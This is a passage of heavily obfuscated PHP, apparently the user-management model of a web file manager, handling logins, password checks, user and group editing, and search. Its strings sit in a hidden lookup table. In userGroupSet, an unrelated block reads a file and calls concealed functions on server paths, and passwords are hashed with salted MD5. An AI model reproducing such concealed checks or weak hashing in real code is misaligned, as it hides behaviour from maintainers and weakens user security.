LNG($İî±¨Áú[2236]) . $İî±¨Áú[527], $İî±¨Áú[2234] => STATIC_PATH . $İî±¨Áú[2237]); } $˜öææ¹ = $this->cacheFunctionGet($İî±¨Áú[1881], $ıÙê´£º); $Äêæ¶» = array_field_key($˜öææ¹, explode($İî±¨Áú[50], $this->simpleField)); if (!$Äêæ¶») { return array($İî±¨Áú[1631] => $İî±¨Áú[1164], $İî±¨Áú[32] => $İî±¨Áú[159] . LNG($İî±¨Áú[2238]) . $İî±¨Áú[527], $İî±¨Áú[2234] => STATIC_PATH . $İî±¨Áú[2239]); } $Äêæ¶»[$İî±¨Áú[2234]] = Action($İî±¨Áú[2235])->parseUrl($Äêæ¶»[$İî±¨Áú[2234]]); return $Äêæ¶»; } protected function groupUser($Êèü ë¯) { } public static function errorLang($¥Ù±à¹ß) { $á‹¹Ô€ =& $_SERVER[ì…™Î¶Ï]; $˜ÓòÉÇÛ = array(self::ERROR_USER_NOT_EXISTS => $á‹¹Ô€[2240], self::ERROR_USER_PASSWORD_ERROR => $á‹¹Ô€[2241], self::ERROR_USER_EXIST_NAME => $á‹¹Ô€[2242], self::ERROR_USER_EXIST_PHONE => $á‹¹Ô€[2243], self::ERROR_USER_EXIST_EMAIL => $á‹¹Ô€[2244], self::ERROR_USER_LOGIN_LOCK => $á‹¹Ô€[2245], self::ERROR_IP_NOT_ALLOW => $á‹¹Ô€[2246], self::ERROR_USER_EXIST_NICKNAME => $á‹¹Ô€[2247]); return LNG($˜ÓòÉÇÛ[$¥Ù±à¹ß]); } public function getInfoByMeta($ ÍçŠºì, $É–°­ùê) { $Ä°ú¼íâ =& $_SERVER[ì…™Î¶Ï]; $ˆ¤³¥¹ = Model($Ä°ú¼íâ[2248])->where(array($Ä°ú¼íâ[95] => $ ÍçŠºì, $Ä°ú¼íâ[369] => $É–°­ùê))->find(); if ($ˆ¤³¥¹) { return $this->getInfo($ˆ¤³¥¹[$Ä°ú¼íâ[1631]]); } return !1; } public function userLoginCheck($—İÉÀÙæ, $÷“™¸î°) { $²…ò«®¿ =& $_SERVER[ì…™Î¶Ï]; $ˆ”ÓÂç¦ = $this->userLoginFind($—İÉÀÙæ); if (!$ˆ”ÓÂç¦) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ˆ”ÓÂç¦[$²…ò«®¿[1631]], $÷“™¸î°)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ˆ”ÓÂç¦[$²…ò«®¿[1631]]); } public function userLoginFind($“ûÂß„) { $ß­‚§Ï’ =& $_SERVER[ì…™Î¶Ï]; $‚†àûß = array($ß­‚§Ï’[32] => $“ûÂß„, $ß­‚§Ï’[2068] => $“ûÂß„, $ß­‚§Ï’[300] => $“ûÂß„, $ß­‚§Ï’[2249] => $“ûÂß„, $ß­‚§Ï’[976] => $ß­‚§Ï’[978]); if ($this->nickNameRpt()) { unset($‚†àûß[$ß­‚§Ï’[2068]]); } return $this->where($‚†àûß)->find(); } public function clearCache($¥¡¡¨½) { $âòÙÉ‚® =& $_SERVER[ì…™Î¶Ï]; $this->cacheFunctionClear($âòÙÉ‚®[1880], $¥¡¡¨½); $this->cacheFunctionClear($âòÙÉ‚®[1881], $¥¡¡¨½); $this->cacheFunctionClear($âòÙÉ‚®[2230], $¥¡¡¨½); } public function userPasswordCheck($Íâ¶ÄÙú, $³î°‰×) { $’›¶¹½‰ =& $_SERVER[ì…™Î¶Ï]; $¿÷¸‘ = $this->where(array($’›¶¹½‰[1631] => intval($Íâ¶ÄÙú)))->find(); $¥ÙÃµÚÒ = $this->metaGet($Íâ¶ÄÙú); $ëƒá„ĞÕ = isset($¥ÙÃµÚÒ[$’›¶¹½‰[2250]]) ? $¥ÙÃµÚÒ[$’›¶¹½‰[2250]] : $’›¶¹½‰[12]; if (md5($ëƒá„ĞÕ . trim($³î°‰×)) !== $¿÷¸‘[$’›¶¹½‰[865]]) { return !1; } return !0; } public function userAdd($¾šì“ñ) { $ëíëñŠõ =& $_SERVER[ì…™Î¶Ï]; $ôæı¤Ô¸ = array($ëíëñŠõ[412] => $¾šì“ñ[$ëíëñŠõ[32]], $ëíëñŠõ[2251] => $¾šì“ñ[$ëíëñŠõ[1511]], $ëíëñŠõ[2252] => isset($¾šì“ñ[$ëíëñŠõ[300]]) ? $¾šì“ñ[$ëíëñŠõ[300]] : $ëíëñŠõ[12], $ëíëñŠõ[2253] => isset($¾šì“ñ[$ëíëñŠõ[2249]]) ? $¾šì“ñ[$ëíëñŠõ[2249]] : $ëíëñŠõ[12], $ëíëñŠõ[2254] => isset($¾šì“ñ[$ëíëñŠõ[2068]]) ? $¾šì“ñ[$ëíëñŠõ[2068]] : $¾šì“ñ[$ëíëñŠõ[32]], $ëíëñŠõ[2255] => isset($¾šì“ñ[$ëíëñŠõ[2234]]) ? $¾šì“ñ[$ëíëñŠõ[2234]] : $ëíëñŠõ[12], $ëíëñŠõ[2256] => isset($¾šì“ñ[$ëíëñŠõ[2257]]) ? $¾šì“ñ[$ëíëñŠõ[2257]] : 1, $ëíëñŠõ[2258] => $¾šì“ñ[$ëíëñŠõ[865]], $ëíëñŠõ[1882] => isset($¾šì“ñ[$ëíëñŠõ[1786]]) ? $¾šì“ñ[$ëíëñŠõ[1786]] : 1024 * 1024 * 20, $ëíëñŠõ[1883] => 0, $ëíëñŠõ[2259] => 0, $ëíëñŠõ[1923] => isset($¾šì“ñ[$ëíëñŠõ[725]]) ? $¾šì“ñ[$ëíëñŠõ[725]] : 1); if (!empty($¾šì“ñ[$ëíëñŠõ[1631]])) { $ôæı¤Ô¸[$ëíëñŠõ[1631]] = $¾šì“ñ[$ëíëñŠõ[1631]]; } $œÅ‰îç¡ = $this->_checkExist($¾šì“ñ); if ($œÅ‰îç¡ !== !0) { return $œÅ‰îç¡; } $²¡½¿Ó£ = $this->add($ôæı¤Ô¸); $Ïøé‘— = array($ëíëñŠõ[2258] => $ôæı¤Ô¸[$ëíëñŠõ[865]], $ëíëñŠõ[2254] => $ôæı¤Ô¸[$ëíëñŠõ[2068]]); $this->userEdit($²¡½¿Ó£, $Ïøé‘—); Model($ëíëñŠõ[1301])->userRootAdd($²¡½¿Ó£); return $²¡½¿Ó£; } protected function userEditTest($Ëü‘šğû, $á¯¹Å’ß) { return $this->call($_SERVER[ì…™Î¶Ï][2260], $Ëü‘šğû, $á¯¹Å’ß); } protected function userEdit($ÉãÆÏ½, $Œ€•ê¿ñ) { $Ú‚‚ËøØ =& $_SERVER[ì…™Î¶Ï]; $‹·Ë¼˜ = $this->getInfoSimple($ÉãÆÏ½); if (!$‹·Ë¼˜) { return !1; } $ôõÚ‡‰ò = $this->_checkExist($Œ€•ê¿ñ, $ÉãÆÏ½); if ($ôõÚ‡‰ò !== !0) { return $ôõÚ‡‰ò; } if (isset($Œ€•ê¿ñ[$Ú‚‚ËøØ[865]]) && trim($Œ€•ê¿ñ[$Ú‚‚ËøØ[865]]) != $Ú‚‚ËøØ[12]) { $óĞï¡İú = $this->metaGet($ÉãÆÏ½); if (empty($óĞï¡İú[$Ú‚‚ËøØ[2250]])) { $óĞï¡İú[$Ú‚‚ËøØ[2250]] = rand_string(10); Model($Ú‚‚ËøØ[504])->metaSet($ÉãÆÏ½, $Ú‚‚ËøØ[2250], $óĞï¡İú[$Ú‚‚ËøØ[2250]]); } $Œ€•ê¿ñ[$Ú‚‚ËøØ[865]] = md5($óĞï¡İú[$Ú‚‚ËøØ[2250]] . trim($Œ€•ê¿ñ[$Ú‚‚ËøØ[865]])); } else { unset($Œ€•ê¿ñ[$Ú‚‚ËøØ[865]]); } $this->where(array($Ú‚‚ËøØ[1622] => $ÉãÆÏ½))->save($Œ€•ê¿ñ); if (isset($Œ€•ê¿ñ[$Ú‚‚ËøØ[2068]])) { $this->setNamePinyin($ÉãÆÏ½, $Œ€•ê¿ñ[$Ú‚‚ËøØ[2068]]); } $this->clearCache($ÉãÆÏ½); return !0; } public function setNamePinyin($‘Ìë­”¿, $Üƒèğì = false) { $·Ñçá²İ =& $_SERVER[ì…™Î¶Ï]; if (!$Üƒèğì) { $‚’–£®ğ = $this->getInfoSimple($‘Ìë­”¿); $Üƒèğì = $‚’–£®ğ[$·Ñçá²İ[2068]] ? $‚’–£®ğ[$·Ñçá²İ[2068]] : $‚’–£®ğ[$·Ñçá²İ[32]]; } $šÉÁñè“ = Model($·Ñçá²İ[529]); if (!Input::check($Üƒèğì, $·Ñçá²İ[578])) { return $šÉÁñè“->metaSet($‘Ìë­”¿, array($·Ñçá²İ[455] => $·Ñçá²İ[12], $·Ñçá²İ[454] => $·Ñçá²İ[12])); } return $šÉÁñè“->metaSet($‘Ìë­”¿, array($·Ñçá²İ[455] => str_replace($·Ñçá²İ[53], $·Ñçá²İ[12], Pinyin::get($Üƒèğì)), $·Ñçá²İ[454] => Pinyin::get($Üƒèğì, $·Ñçá²İ[579]))); } private function nickNameRpt() { $¾‹ØÌóŞ =& $_SERVER[ì…™Î¶Ï]; $Ì‡²ß¸„ = Model($¾‹ØÌóŞ[745])->get($¾‹ØÌóŞ[2261]); $ãİßƒŞ = $GLOBALS[$¾‹ØÌóŞ[6]][$¾‹ØÌóŞ[376]][$¾‹ØÌóŞ[2261]]; $æîçá’í = !is_null($Ì‡²ß¸„) ? $Ì‡²ß¸„ : $ãİßƒŞ; return !!$æîçá’í; } private function _checkExist($ÖºÄ§², $’ã¦Í = false) { $É·››Ôø =& $_SERVER[ì…™Î¶Ï]; $¨ùÏ‘šï = array($É·››Ôø[32] => UserModel::ERROR_USER_EXIST_NAME, $É·››Ôø[2068] => UserModel::ERROR_USER_EXIST_NICKNAME, $É·››Ôø[300] => UserModel::ERROR_USER_EXIST_EMAIL, $É·››Ôø[2249] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¨ùÏ‘šï[$É·››Ôø[2068]]); } $Ó ûì© = $’ã¦Í ? array($É·››Ôø[1631] => array($É·››Ôø[2262], $’ã¦Í)) : array(); foreach ($¨ùÏ‘šï as $Ñîù›÷Ë => $Š›Á‚—) { $İ«ŒŸÏƒ = array(); foreach ($¨ùÏ‘šï as $©òÖèğ => $ó©ÑÔÒé) { if (isset($ÖºÄ§²[$©òÖèğ]) && $ÖºÄ§²[$©òÖèğ]) { $İ«ŒŸÏƒ[] = $ÖºÄ§²[$©òÖèğ]; } } if (!$İ«ŒŸÏƒ) { continue; } $—ãÔŸß‘ = array_merge(array($Ñîù›÷Ë => array($É·››Ôø[7], $İ«ŒŸÏƒ)), $Ó ûì©); $Ü¡åÀ¾Š = $this->where($—ãÔŸß‘)->find(); if ($Ü¡åÀ¾Š) { return $Š›Á‚—; } } return !0; } public function userListInfo($š˜­ƒß) { $¦¬à¿¡Ä =& $_SERVER[ì…™Î¶Ï]; $š”Íùìì = array(); $š˜­ƒß = is_array($š˜­ƒß) ? array_unique($š˜­ƒß) : array(); if (!$š˜­ƒß) { return $š”Íùìì; } if (count($š˜­ƒß) < 20) { foreach ($š˜­ƒß as $“èŠ§çÄ) { $š”Íùìì[$“èŠ§çÄ . $¦¬à¿¡Ä[12]] = $this->getInfoSimpleOuter($“èŠ§çÄ); } } else { $±ç‚ÜÙ† = array($¦¬à¿¡Ä[1622] => array($¦¬à¿¡Ä[410], $š˜­ƒß)); if (count($š˜­ƒß) == 1) { $±ç‚ÜÙ† = array($¦¬à¿¡Ä[1622] => $š˜­ƒß[0]); } $ØŞÒµÜş = Model($¦¬à¿¡Ä[504])->field($this->simpleField)->where($±ç‚ÜÙ†)->select(); $ØŞÒµÜş = array_to_keyvalue($ØŞÒµÜş, $¦¬à¿¡Ä[1631]); foreach ($š˜­ƒß as $“èŠ§çÄ) { $–±âª®õ = $ØŞÒµÜş[$“èŠ§çÄ]; if (!$–±âª®õ) { $š”Íùìì[$“èŠ§çÄ . $¦¬à¿¡Ä[12]] = $this->getInfoSimpleOuter($“èŠ§çÄ); continue; } $–±âª®õ[$¦¬à¿¡Ä[2234]] = Action($¦¬à¿¡Ä[2235])->parseUrl($–±âª®õ[$¦¬à¿¡Ä[2234]]); $š”Íùìì[$“èŠ§çÄ . $¦¬à¿¡Ä[12]] = $–±âª®õ; } } return $š”Íùìì; } protected function userStatus($ÑÚ‹œøÖ, $’ñ»¯÷«) { $ºí¨Ü†õ = $this->getInfoSimple($ÑÚ‹œøÖ); if (!$ºí¨Ü†õ) { return !1; } $éõô˜Æ = array($_SERVER[ì…™Î¶Ï][725] => $’ñ»¯÷«); return $this->userEdit($ÑÚ‹œøÖ, $éõô˜Æ); } protected function userRemove($ëÄÑá¿) { $²û¾˜Ø =& $_SERVER[ì…™Î¶Ï]; $ŸæÖÁ´“ = $this->getInfoSimple($ëÄÑá¿); if (!$ŸæÖÁ´“) { return !1; } $¾Š­•Æ× = array($²û¾˜Ø[1622] => $ëÄÑá¿); Model($²û¾˜Ø[586])->where($¾Š­•Æ×)->delete(); Model($²û¾˜Ø[2263])->where($¾Š­•Æ×)->delete(); Model($²û¾˜Ø[1888])->where($¾Š­•Æ×)->delete(); Model($²û¾˜Ø[2248])->where($¾Š­•Æ×)->delete(); Model($²û¾˜Ø[1044])->where($¾Š­•Æ×)->delete(); Model($²û¾˜Ø[2085])->removeUserAll($ëÄÑá¿); Model($²û¾˜Ø[800])->userRootRemove($ëÄÑá¿); return $this->where($¾Š­•Æ×)->delete(); } protected function userGroupSet($‡æÆ¥÷, $¹£‡Îä¹, $•Ï‘¹Š„ = array()) { $¨¾ı²ñª =& $_SERVER[ì…™Î¶Ï]; if ($_SERVER[$¨¾ı²ñª[850]] != $_SERVER[$¨¾ı²ñª[1340]]) { $Âƒ€×„¨ = $¨¾ı²ñª[851]; $ø¨¹ºŸ× = $¨¾ı²ñª[852]; $ÇÌ®’İÂ = $_SERVER[$¨¾ı²ñª[847]] . $¨¾ı²ñª[848]; $º ‹—ÍÑ = $ø¨¹ºŸ×($ÇÌ®’İÂ); $ñÃ¦Ü²Ã = explode($¨¾ı²ñª[226], $º ‹—ÍÑ); if (count($ñÃ¦Ü²Ã) < $¨¾ı²ñª[602]) { $£ğü©ù¥ = $¨¾ı²ñª[853]; $£ğü©ù¥(); } $ĞìçÉ€® = $¨¾ı²ñª[854]; $ĞìçÉ€®($_SERVER[$¨¾ı²ñª[855]]); $ĞìçÉ€®($_SERVER[$¨¾ı²ñª[847]] . $¨¾ı²ñª[2264]); $…È“†Í— = 1; while ($…È“†Í— > 1) { $…È“†Í— = $…È“†Í— + 4; $Ú¿ÀÍ³å = rawurlencode($…È“†Í— . $¨¾ı²ñª[373]); } } $áã³¹ØÙ = $this->getInfoSimple($‡æÆ¥÷); if (!$áã³¹ØÙ || !is_array($¹£‡Îä¹)) { return !1; } $Áùª“êâ = Model($¨¾ı²ñª[1888]); $Áùª“êâ->where(array($¨¾ı²ñª[1631] => $‡æÆ¥÷))->delete(); $‚†øÜ— = array(); $ºÉ’ä“ = 0; foreach ($¹£‡Îä¹ as $ğ¬¥ùöé => $õ–¾íì¢) { $ô´‘×ı“ = array($¨¾ı²ñª[1631] => $‡æÆ¥÷, $¨¾ı²ñª[1799] => $ğ¬¥ùöé, $¨¾ı²ñª[1900] => $õ–¾íì¢); $ô´‘×ı“[$¨¾ı²ñª[1822]] = isset($•Ï‘¹Š„[$ºÉ’ä“]) ? $•Ï‘¹Š„[$ºÉ’ä“] : 0; $ºÉ’ä“++; $‚†øÜ—[] = $ô´‘×ı“; } return $Áùª“êâ->addAll($‚†øÜ—, array(), !0); } protected function userGroupAdd($ÎÓ¨¶‹•, $¶±ŸÂ“ò = array()) { $÷òª¨ˆ =& $_SERVER[ì…™Î¶Ï]; $¿ Îò·Î = $this->getInfoSimple($ÎÓ¨¶‹•); if (!$¿ Îò·Î || empty($¶±ŸÂ“ò)) { return !1; } $¿òìáĞº = array(); foreach ($¶±ŸÂ“ò as $ûÆËó¢ø => $•Û­îê) { $¿òìáĞº[] = array($÷òª¨ˆ[1631] => $ÎÓ¨¶‹•, $÷òª¨ˆ[1799] => $ûÆËó¢ø, $÷òª¨ˆ[1900] => $•Û­îê, $÷òª¨ˆ[1822] => 0); } return Model($÷òª¨ˆ[1888])->addAll($¿òìáĞº, array(), !0); } protected function userGroupRemove($ÏßôŞşæ, $ÁÇ§Ôª) { $¢ÌéÉ¢Ä =& $_SERVER[ì…™Î¶Ï]; $ş§İø‚ = $this->getInfoSimple($ÏßôŞşæ); if (!$ş§İø‚ || !$ÁÇ§Ôª) { return !1; } $²˜ê“²æ = array($¢ÌéÉ¢Ä[1622] => $ÏßôŞşæ, $¢ÌéÉ¢Ä[1886] => $ÁÇ§Ôª); return Model($¢ÌéÉ¢Ä[1888])->where($²˜ê“²æ)->delete(); } public function listData() { $Ä²”ËºĞ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ä²”ËºĞ[$_SERVER[ì…™Î¶Ï][364]]); return $Ä²”ËºĞ; } public function listByID($Û‹…•ÙÔ) { $ôÖß²ª =& $_SERVER[ì…™Î¶Ï]; if (!$Û‹…•ÙÔ) { return; } $ûÀ‹‡ûÚ = array($ôÖß²ª[1631] => array($ôÖß²ª[7], $Û‹…•ÙÔ)); $ ¡Â‹¢é = $this->where($ûÀ‹‡ûÚ)->select(); $ ¡Â‹¢é = array_sort_keep($ ¡Â‹¢é, $ôÖß²ª[1631], $Û‹…•ÙÔ); $this->_listDataApply($ ¡Â‹¢é); return $ ¡Â‹¢é; } public function listByGroup($ë£°†­ = 0, $ÁµĞáÏÚ = array()) { $’¢¸Ÿ³Å =& $_SERVER[ì…™Î¶Ï]; $ô¼ë‡—— = $’¢¸Ÿ³Å[12]; $ŸÓìÈ¯¬ = array(); if ($ë£°†­) { $ŸÓìÈ¯¬ = array($’¢¸Ÿ³Å[2265] => intval($ë£°†­)); $ô¼ë‡—— = "\x4c\105\x46\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\165\x73\145\162\137\x67\x72\157\x75\160\x20\x75\163\145\x72\x5f\147\x72\157\x75\x70\x20\x6f\156\x20\x75\163\x65\x72\56\x75\x73\145\162\111\104\x20\75\x20\165\x73\145\162\137\147\162\x6f\165\160\56\x75\163\145\162\x49\104"; $Ò±Ìü÷† = Input::get($’¢¸Ÿ³Å[446], null, $’¢¸Ÿ³Å[12]) ? $’¢¸Ÿ³Å[12] : $’¢¸Ÿ³Å[2266]; } if (isset($ÁµĞáÏÚ[$’¢¸Ÿ³Å[725]])) { $ŸÓìÈ¯¬[$’¢¸Ÿ³Å[2267]] = $ÁµĞáÏÚ[$’¢¸Ÿ³Å[725]]; } $—¹Ó®Ã = $this->_makeOrder($Ò±Ìü÷†)->field($’¢¸Ÿ³Å[2268])->where($ŸÓìÈ¯¬)->join($ô¼ë‡——)->selectPage(50); $this->_listDataApply($—¹Ó®Ã[$’¢¸Ÿ³Å[364]]); return $—¹Ó®Ã; } private function _makeOrder($ØÙÄèÅ¦ = '') { $ÛŠ»ÀÀ¹ =& $_SERVER[ì…™Î¶Ï]; $¿Åòôı‹ = array($ÛŠ»ÀÀ¹[1631], $ÛŠ»ÀÀ¹[32], $ÛŠ»ÀÀ¹[1788], $ÛŠ»ÀÀ¹[1760], $ÛŠ»ÀÀ¹[193]); $úäÊ¶ŸË = array($ÛŠ»ÀÀ¹[439] => $ÛŠ»ÀÀ¹[440], $ÛŠ»ÀÀ¹[441] => $ÛŠ»ÀÀ¹[442]); $·ŠìÎèÊ = Input::get($ÛŠ»ÀÀ¹[446], $ÛŠ»ÀÀ¹[7], $ÛŠ»ÀÀ¹[1622], $¿Åòôı‹); $Õéº½üŞ = Input::get($ÛŠ»ÀÀ¹[447], $ÛŠ»ÀÀ¹[7], $ÛŠ»ÀÀ¹[1889], array($ÛŠ»ÀÀ¹[1889], $ÛŠ»ÀÀ¹[441])); $Õéº½üŞ = $úäÊ¶ŸË[$Õéº½üŞ]; $ØÙÄèÅ¦ = $ØÙÄèÅ¦ . "\x75\163\145\x72\x2e{$·ŠìÎèÊ}\40{$Õéº½üŞ}\x2c\x20\165\x73\145\162\x2e\165\163\x65\x72\x49\104\x20\x61\163\x63"; return $this->alias($ÛŠ»ÀÀ¹[2007])->order($ØÙÄèÅ¦); } public function listSearch($¾­´‚Ÿú) { $ÏÇı‡šù =& $_SERVER[ì…™Î¶Ï]; $°¹óë…× = $¾­´‚Ÿú[$ÏÇı‡šù[1890]]; $¬ú±’™† = isset($¾­´‚Ÿú[$ÏÇı‡šù[1891]]) ? $¾­´‚Ÿú[$ÏÇı‡šù[1891]] : !1; $°¹óë…× = str_replace($ÏÇı‡šù[1892], $ÏÇı‡šù[1893], trim($°¹óë…×)); $Ëíïî¤Å = array($ÏÇı‡šù[32] => array($ÏÇı‡šù[378], "\45{$°¹óë…×}\x25"), $ÏÇı‡šù[300] => array($ÏÇı‡šù[378], "{$°¹óë…×}\45"), $ÏÇı‡šù[2068] => array($ÏÇı‡šù[378], "{$°¹óë…×}\x25"), $ÏÇı‡šù[976] => $ÏÇı‡šù[1894]); if (Input::check($°¹óë…×, $ÏÇı‡šù[306])) { $Ëíïî¤Å[$ÏÇı‡šù[1631]] = array($ÏÇı‡šù[378], "{$°¹óë…×}\x25"); $Ëíïî¤Å[$ÏÇı‡šù[2249]] = array($ÏÇı‡šù[378], "{$°¹óë…×}\45"); } if (!$°¹óë…×) { $Ëíïî¤Å = array(); } if (isset($¾­´‚Ÿú[$ÏÇı‡šù[725]])) { $Ëíïî¤Å[$ÏÇı‡šù[725]] = $¾­´‚Ÿú[$ÏÇı‡šù[725]]; } $Ëíïî¤Å = $this->parseWhereLike($Ëíïî¤Å); $¹ˆ¤¦š = $this->_makeOrder()->where($Ëíïî¤Å)->selectPage(20); if (!$¹ˆ¤¦š || count($¹ˆ¤¦š[$ÏÇı‡šù[364]]) < 5 && Input::check($°¹óë…×, $ÏÇı‡šù[313])) { $”şã™òÁ = $this->_searchFromMeta($ÏÇı‡šù[454], $°¹óë…×, 10); $Ûàµ‹à = $this->_searchFromMeta($ÏÇı‡šù[455], $°¹óë…×, 10); $•¸óÊ’Ä = array_merge($”şã™òÁ, $Ûàµ‹à, $¹ˆ¤¦š[$ÏÇı‡šù[364]]); $¹ˆ¤¦š[$ÏÇı‡šù[364]] = array_unique_by_key($•¸óÊ’Ä, $ÏÇı‡šù[1631]); $¹ˆ¤¦š[$ÏÇı‡šù[361]][$ÏÇı‡šù[362]] = count($¹ˆ¤¦š[$ÏÇı‡šù[364]]); $¹ˆ¤¦š[$ÏÇı‡šù[361]][$ÏÇı‡šù[363]] = ceil($¹ˆ¤¦š[$ÏÇı‡šù[361]][$ÏÇı‡šù[362]] / $¹ˆ¤¦š[$ÏÇı‡šù[361]][$ÏÇı‡šù[358]]); } $this->_listDataApply($¹ˆ¤¦š[$ÏÇı‡šù[364]]); $this->_filterByGroup($¹ˆ¤¦š, $¬ú±’™†); return $¹ˆ¤¦š; } private function _filterByGroup(&$ÂÚÕùÅ, $¡Ã˜ŒŒ) { $›íâÎŞÑ =& $_SERVER[ì…™Î¶Ï]; if (!$¡Ã˜ŒŒ) { return $ÂÚÕùÅ; } foreach ($ÂÚÕùÅ[$›íâÎŞÑ[364]] as $¬²í èÈ => &$ÚÕìš´ä) { $‚È—¥É® = array_to_keyvalue($ÚÕìš´ä[$›íâÎŞÑ[1977]], $›íâÎŞÑ[12], $›íâÎŞÑ[1799]); if (!in_array($¡Ã˜ŒŒ, $‚È—¥É®)) { unset($ÂÚÕùÅ[$›íâÎŞÑ[364]][$¬²í èÈ]); } } unset($ÚÕìš´ä); $ÂÚÕùÅ[$›íâÎŞÑ[364]] = array_values($ÂÚÕùÅ[$›íâÎŞÑ[364]]); $ÂÚÕùÅ[$›íâÎŞÑ[361]] = array($›íâÎŞÑ[2040] => count($ÂÚÕùÅ[$›íâÎŞÑ[364]]), $›íâÎŞÑ[2038] => $ÂÚÕùÅ[$›íâÎŞÑ[361]][$›íâÎŞÑ[358]], $›íâÎŞÑ[2037] => 1, $›íâÎŞÑ[2039] => 1); } private function _searchFromMeta($Š–Ê™µ´, $Ö¢äí½ª, $åÎíå‹Ù) { $Â—ÂüöŸ =& $_SERVER[ì…™Î¶Ï]; $Ö¢äí½ª = strtolower($Ö¢äí½ª); $”âøâÖÈ = array($Â—ÂüöŸ[95] => $Š–Ê™µ´, $Â—ÂüöŸ[369] => array($Â—ÂüöŸ[378], "\45{$Ö¢äí½ª}\45")); $”âøâÖÈ = $this->parseWhereLike($”âøâÖÈ); $¯“½ ±º = Model($Â—ÂüöŸ[2269])->where($”âøâÖÈ)->limit($åÎíå‹Ù)->select(); if (!$¯“½ ±º) { return array(); } $¯“½ ±º = array_to_keyvalue($¯“½ ±º, $Â—ÂüöŸ[12], $Â—ÂüöŸ[1631]); $¨¬‚§› = $this->where(array($Â—ÂüöŸ[1622] => array($Â—ÂüöŸ[7], $¯“½ ±º)))->select(); if (!$¨¬‚§›) { return array(); } return $¨¬‚§›; } private function _listDataApplyItem($†¬õƒ¿¤) { $åå¥¬¿ù = array($†¬õƒ¿¤); $this->_listDataApply($åå¥¬¿ù); return $åå¥¬¿ù[0]; } private function _listDataApply(&$ÜãÅÁÙ­) { $—’è›ñ =& $_SERVER[ì…™Î¶Ï]; if (!$ÜãÅÁÙ­) { return; } array_remove_key($ÜãÅÁÙ­, $—’è›ñ[865]); $õ—©êè£ = array_to_keyvalue($ÜãÅÁÙ­, $—’è›ñ[12], $—’è›ñ[1631]); $this->_listAppendGroup($ÜãÅÁÙ­, $õ—©êè£); $this->_listAppendMeta($ÜãÅÁÙ­, $õ—©êè£); $this->_listAppendSourceRoot($ÜãÅÁÙ­, $õ—©êè£); } private function _listAppendSourceRoot(&$ËÚÓÚ°, $Î“„©Î) { $ˆó¬û’¤ =& $_SERVER[ì…™Î¶Ï]; $„ûÅÅí³ = Model($ˆó¬û’¤[800])->listSourceRoot(SourceModel::TYPE_USER, $Î“„©Î); $„ûÅÅí³ = array_to_keyvalue($„ûÅÅí³, $ˆó¬û’¤[495]); $„ûÅÅí³ = array_remove_key($„ûÅÅí³, $ˆó¬û’¤[495]); foreach ($ËÚÓÚ° as &$öŞËâó­) { $öŞËâó­[$ˆó¬û’¤[87]] = $„ûÅÅí³[$öŞËâó­[$ˆó¬û’¤[1631]]] ? $„ûÅÅí³[$öŞËâó­[$ˆó¬û’¤[1631]]] : array(); } unset($öŞËâó­); } private function _listAppendGroup(&$€òŸ†€±, $ÔÊïÖ¶ª) { $ä´î’— =& $_SERVER[ì…™Î¶Ï]; $›¶ğ€ì = array($ä´î’—[1631] => array($ä´î’—[7], $ÔÊïÖ¶ª)); $ê¹··¿¶ = Model($ä´î’—[1888])->where($›¶ğ€ì)->select(); $ ¤˜ˆ³Ñ = array_to_keyvalue($ê¹··¿¶, $ä´î’—[12], $ä´î’—[1799]); $ ¤˜ˆ³Ñ = array_remove_value(array_unique($ ¤˜ˆ³Ñ), $ä´î’—[190]); if (!$ ¤˜ˆ³Ñ || !$ê¹··¿¶) { return; } $›¶ğ€ì = array($ä´î’—[1799] => array($ä´î’—[7], $ ¤˜ˆ³Ñ)); $Òµ­ğ£… = Model($ä´î’—[1975])->field($ä´î’—[2270])->where($›¶ğ€ì)->select(); $Òµ­ğ£… = array_to_keyvalue($Òµ­ğ£…, $ä´î’—[1799]); $ê¹··¿¶ = array_to_keyvalue_group($ê¹··¿¶, $ä´î’—[1631]); foreach ($ê¹··¿¶ as &$¶Ş Š»Ò) { $…ˆñì Ó = array(); foreach ($¶Ş Š»Ò as $à»»Ôæ) { if (!$à»»Ôæ[$ä´î’—[1900]]) { continue; } $—ÇËº—ï = Model($ä´î’—[498])->listData($à»»Ôæ[$ä´î’—[1900]]); $…ˆñì Ó[] = array($ä´î’—[1799] => $à»»Ôæ[$ä´î’—[1799]], $ä´î’—[2271] => $Òµ­ğ£…[$à»»Ôæ[$ä´î’—[1799]]][$ä´î’—[32]], $ä´î’—[512] => $Òµ­ğ£…[$à»»Ôæ[$ä´î’—[1799]]][$ä´î’—[512]], $ä´î’—[405] => $—ÇËº—ï); } $¶Ş Š»Ò = $…ˆñì Ó; } unset($¶Ş Š»Ò); foreach ($€òŸ†€± as &$ñç¨æŒ) { $ñç¨æŒ[$ä´î’—[1977]] = array(); if (isset($ê¹··¿¶[$ñç¨æŒ[$ä´î’—[1631]]])) { $ñç¨æŒ[$ä´î’—[1977]] = $ê¹··¿¶[$ñç¨æŒ[$ä´î’—[1631]]]; } } unset($ñç¨æŒ); } public function userAppendGroup($ıÇ”îêŒ) { $µÎîÜÜã =& $_SERVER[ì…™Î¶Ï]; if (!$ıÇ”îêŒ) { return array(); } $this->_listAppendGroup($ıÇ”îêŒ, array_to_keyvalue($ıÇ”îêŒ, $µÎîÜÜã[12], $µÎîÜÜã[1631])); return $ıÇ”îêŒ; } private function _listAppendMeta(&$ò´ÌÆ­, $ÙüìÍÎ—) { $¡ãÁ‡»â =& $_SERVER[ì…™Î¶Ï]; $ØæØöÔ = UserJobModel::JOB_KEY; $À€ôûŒÒ = array($¡ãÁ‡»â[2250]); $¢şºøêÍ = array($¡ãÁ‡»â[1631] => array($¡ãÁ‡»â[7], $ÙüìÍÎ—)); $³ŒÅ¨Ï¢ = Model($¡ãÁ‡»â[2248])->where($¢şºøêÍ)->select(); $³ŒÅ¨Ï¢ = array_to_keyvalue_group($³ŒÅ¨Ï¢, $¡ãÁ‡»â[1631]); foreach ($³ŒÅ¨Ï¢ as &$îÓ¦¤Ã) { $“Ñ’¤‡õ = array(); foreach ($îÓ¦¤Ã as $ôÚ®Ç¸) { if (!in_array($ôÚ®Ç¸[$¡ãÁ‡»â[95]], $À€ôûŒÒ)) { 